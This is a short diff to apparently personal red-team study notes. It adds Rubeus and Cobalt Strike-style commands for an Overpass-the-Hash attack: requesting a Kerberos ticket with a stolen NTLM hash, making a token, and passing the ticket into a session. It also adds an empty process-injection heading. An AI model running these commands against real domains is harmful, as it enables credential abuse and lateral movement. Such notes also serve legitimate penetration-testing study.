@@ -26,14 +26,19 @@ runas.exe /netonly
 
 #Overpass-the-Hash
 Rubeus triage
+Remember LUID
 Rubeus asktgt /user:user /rc4:ntlmhash
+Rubeus asktgt /user:user /ntlm:ntlmhash
 -Copy to base64 and remove spaces
 Find & Replace option (Edit > Replace or Ctrl+H)
 Now make a token
-MakeToken user domain  || because if you
+MakeToken user domain  || because if you used the actual session you will have problems
 Rubeus triage
 Rubeus ptt /ticket:<base64-encoded-ticket>
 Use RevToSelf to revert to the previous logon session (and Rubeus triage to confirm).
+
+#Process Injection
+
 
 
 
